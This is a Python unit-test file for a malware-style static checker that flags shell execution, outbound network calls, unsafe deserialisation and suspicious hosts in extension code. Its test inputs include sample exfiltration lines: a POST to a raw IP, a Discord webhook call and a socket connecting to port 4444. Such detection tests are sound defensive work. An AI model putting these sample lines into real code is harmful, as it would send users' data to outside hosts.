import io
import json
import sys
import tempfile
import unittest
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parents[1]))

from jest_ext_py import __main__ as cli  # noqa: E402
from jest_ext_py.pycheck import check_source, suspicious_target  # noqa: E402


def vectors(src: str) -> list[str]:
    return [h.vector for h in check_source(src).hits]


class PyCheckTest(unittest.TestCase):
    def test_exec(self):
        self.assertEqual(vectors("import subprocess as sp\nsp.run(cmd, shell=True)"), ["ext/python-exec"])
        self.assertEqual(vectors("from os import system\nsystem('ls')"), ["ext/python-exec"])
        self.assertEqual(vectors("exec(payload)"), ["ext/python-exec"])
        self.assertEqual(vectors("eval('1+1')"), [])
        self.assertEqual(vectors("print('subprocess.run')"), [])
        hit = check_source("import subprocess\nsubprocess.run(['git', 'status'])").hits[0]
        self.assertEqual((hit.line, hit.confidence), (2, 0.6))

    def test_network(self):
        self.assertEqual(vectors("import requests\nrequests.post('http://45.13.22.7/c', data=d)"), ["ext/python-network"])
        self.assertEqual(vectors("import urllib.request\nurllib.request.urlopen('https://discord.com/api/webhooks/1/x')"), ["ext/python-network"])
        self.assertEqual(vectors("import socket\ns = socket.socket()\ns.connect(('45.13.22.7', 4444))"), ["ext/python-network"])
        self.assertEqual(vectors("import requests\nrequests.get('https://pypi.org/simple')"), [])
        self.assertEqual(vectors("import socket\ns.connect(('127.0.0.1', 80))"), [])

    def test_deserialize(self):
        self.assertEqual(vectors("import pickle\npickle.loads(blob)"), ["ext/python-deserialize"])
        self.assertEqual(vectors("import yaml\nyaml.load(text)"), ["ext/python-deserialize"])
        self.assertEqual(vectors("import yaml\nyaml.load(text, Loader=yaml.SafeLoader)"), [])
        self.assertEqual(vectors("import json\njson.loads(text)"), [])

    def test_targets_and_syntax_errors(self):
        self.assertIsNone(suspicious_target("http://192.168.0.1/"))
        self.assertIsNotNone(suspicious_target("abcdefghijklmnop.onion"))
        self.assertIsNotNone(check_source("def (:").error)

    def test_protocol(self):
        with tempfile.TemporaryDirectory() as d:
            (Path(d) / "tool.py").write_text("import pickle, os\nos.system(cmd)\npickle.loads(b)\n")
            (Path(d) / "node_modules").mkdir()
            (Path(d) / "node_modules" / "skip.py").write_text("exec(x)")
            req = {"protocol": 1, "extensions": [{"id": "a.b", "version": "1", "path": d, "manifest": {}}],
                   "vectors": ["ext/python-exec", "ext/python-deserialize", "ext/ml-anomaly"], "options": {}}
            stdin, stdout = sys.stdin, sys.stdout
            sys.stdin, sys.stdout = io.StringIO(json.dumps(req)), io.StringIO()
            try:
                self.assertEqual(cli.main(["analyze"]), 0)
                lines = [json.loads(line) for line in sys.stdout.getvalue().splitlines()]
            finally:
                sys.stdin, sys.stdout = stdin, stdout
        signals = {m["vector"]: m for m in lines if m["type"] == "signal"}
        self.assertEqual(set(signals), {"ext/python-exec", "ext/python-deserialize"})
        self.assertEqual(signals["ext/python-exec"]["locations"][0], {"file": "tool.py", "line": 2, "col": 1})
        done = lines[-1]
        self.assertEqual(done["ran"], ["ext/python-exec", "ext/python-deserialize"])
        self.assertEqual(done["skipped"][0]["id"], "ext/ml-anomaly")


if __name__ == "__main__":
    unittest.main()
